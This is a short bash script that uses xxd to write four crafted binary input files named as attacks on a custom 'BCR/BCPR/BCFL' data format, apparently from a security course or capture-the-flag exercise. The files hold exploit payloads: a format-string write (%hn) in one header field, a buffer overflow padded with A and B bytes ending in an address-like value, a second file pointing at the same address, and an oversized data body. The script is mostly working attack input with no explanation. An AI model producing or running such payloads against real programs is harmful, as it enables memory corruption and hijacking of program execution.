#!/bin/bash

xxd -r >attack-1.bcraw <<EOF
00000000: 00 42 43 52 c3 84 57 0a 00 00 00 00 00 00 00 08  .BCR..W.........
00000010: 00 00 00 00 00 00 00 03 00 00 00 00 00 00 00 02  ................
00000020: 54 49 4d 45 00 00 00 00 00 00 00 08 00 00 00 00  TIME............
00000030: 00 40 b2 b8 46 52 4d 54 00 00 00 00 00 00 00 15  .@..FRMT........
00000040: 25 30 31 36 78 25 30 31 36 78 25 30 31 36 34 33  %016x%016x%01643
00000050: 30 78 25 68 6e 44 41 54 41 80 80 80 80 80 80 80  0x%hnDATA.......
00000060: 80 80 80 80 80 80 80 80 80 80 80
EOF


xxd -r >attack-2.bcraw <<EOF
00000000: 00 42 43 52 c3 84 57 0a 00 00 00 00 00 00 00 08  .BCR..W.........
00000010: 00 00 00 00 40 00 00 04 00 00 00 00 40 00 00 04  ....@.......@...
00000020: 44 41 54 41 41 41 41 41 41 41 41 41 41 41 41 41  DATAAAAAAAAAAAAA
00000030: 41 41 41 41 41 41 41 41 41 41 41 41 42 42 42 42  AAAAAAAAAAAABBBB
00000040: 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
00000050: 42 42 42 42 04 00 00 00 00 00 00 00 01 00 00 00  BBBB............
00000060: 00 00 00 00 4e 40 40 00 00 00 00 00              ....N@@.....
EOF


xxd -r >attack-3.bcprog <<EOF
00000000: 42 43 50 52 c3 96 47 0a 00 00 00 00 00 00 01 d8  BCPR..G.........
00000010: 00 00 00 00 00 00 00 18 00 00 00 00 00 00 00 02  ................
00000020: 54 49 4d 45 00 00 00 00 00 00 00 08 00 00 00 00  TIME............
00000030: 65 9d 6d d9 44 41 54 41 00 00 00 00 00 00 00 00  e.m.DATA........
00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000050: 18 00 00 00 00 00 00 00 02 00 00 00 00 00 00 00  ................
00000060: 4e 40 40 00 00 00 00 00 00 00 00 00 00 00 00 00  N@@.............
00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
EOF


xxd -r >attack-4.bcflat <<EOF
00000000: 42 43 46 4c c3 84 54 0a 00 00 00 00 00 00 0d 03  BCFL..T.........
00000010: 00 00 00 00 00 00 03 be 00 00 00 00 00 00 00 01  ................
00000020: 54 49 4d 45 00 00 00 00 00 00 00 08 00 00 00 00  TIME............
00000030: 65 9d 6e c1 44 41 54 41 41 3e 7c f9 f3 e7 cf 9f  e.n.DATAA>|.....
00000040: 3e 7c f9 f3 e7 cf 9f 3e 7c f9 f3 e7 cf 9f 3e 7c  >|.....>|.....>|
00000050: f9 f3 e7 cf 9f 3e 7c f9 f3 e7 cf 9f 3e 7c f9 f3  .....>|.....>|..
00000060: e7 cf 9f 3e 7c f9 f3 e7 cf 9f 3e 7c f9 f3 e7 cf  ...>|.....>|....
00000070: 9f 3e 7c f9 f3 e7 cf 9f 3e 7c f9 f3 e7 cf 9f 3e  .>|.....>|.....>
00000080: 7c f9 f3 e7 cf 9f 3e 7c f9 f3 e7 cf 9f 3e 7c f9  |.....>|.....>|.
00000090: f3 e7 cf 9f 3e 7c f9 f3 fc 2f 13 3b fe           ....>|.../.;.
EOF
